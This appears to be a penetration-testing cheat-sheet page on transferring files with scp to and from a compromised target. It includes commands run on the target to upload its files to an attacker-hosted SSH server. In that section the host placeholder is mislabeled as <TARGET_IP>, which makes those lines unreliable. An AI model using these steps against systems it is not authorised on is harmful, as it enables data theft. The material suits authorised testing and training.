---
title: SSH File Transfer
description: Learn how to transfer files from and to a compromised target using SSH.
categories: [File Transfer]
tags: [File Transfer, SSH]
weight: 2
---

The main advantage of file transfer using SSH is that files are encrypted in transit via SSH tunneling.

To transfer files via SSH, we use the `scp` utility, which allows files to be copied between two hosts through SSH tunneling.

## SSH File Transfer (Connect to Target Server)
If we have SSH access on the target host, we can run the `scp` command on our attacker machine to transfer files.

### Download Operation
To download a file from the target to our machine, we specify the remote path (`user@host:<PATH>`) as the copy source, and a local path as the destination.
```bash
scp <USER>@<TARGET_IP>:<REMOTE_PATH> <LOCAL_PATH>
```
`scp` can also authenticate to the target SSH server using public-key authentication. We use `-i` to specify path to the private key.
```bash
scp -i <PRIV_KEY_PATH> <USER>@<TARGET_IP>:<REMOTE_PATH> <LOCAL_PATH>
```
If the SSH server listens on a different port, we can use `-P` to specify port manually.
```bash
scp -P <PORT> <USER>@<TARGET_IP>:<REMOTE_PATH> <LOCAL_PATH>
```

### Upload Operation
To upload a file from the attacker machine to the target, we specify the local file path as copy source and the remote path as the destination.
```bash
scp <LOCAL_PATH> <USER>@<TARGET_IP>:<REMOTE_PATH>
```

## SSH File Transfer (Connect to Attacker Server)
If we cannot login via SSH on the target, or if SSH is not running at all (rarer on Unix-like hosts), we can run `scp` from the target and connect to an SSH server we host on the attacker machine.

To start SSH server on the attacker machine:
```bash
sudo systemctl start ssh
```
> Note: The names for the SSH Server service may differ across distros. Some may call it `ssh`, `sshd`, or `openssh`. Check your distro documentation for details.

### Download Operation
Since server now runs on attacker machine, this means file will be downloaded from the attacker machine to the target. Run the following command on the target:
```bash
scp <USER>@<TARGET_IP>:<REMOTE_PATH> <LOCAL_PATH>
```

### Upload Operation
Since server now runs on attacker machine, this means file will be upload from the target to the attacker machine. Run the following command on the target:
```bash
scp <LOCAL_PATH> <USER>@<TARGET_IP>:<REMOTE_PATH>
```
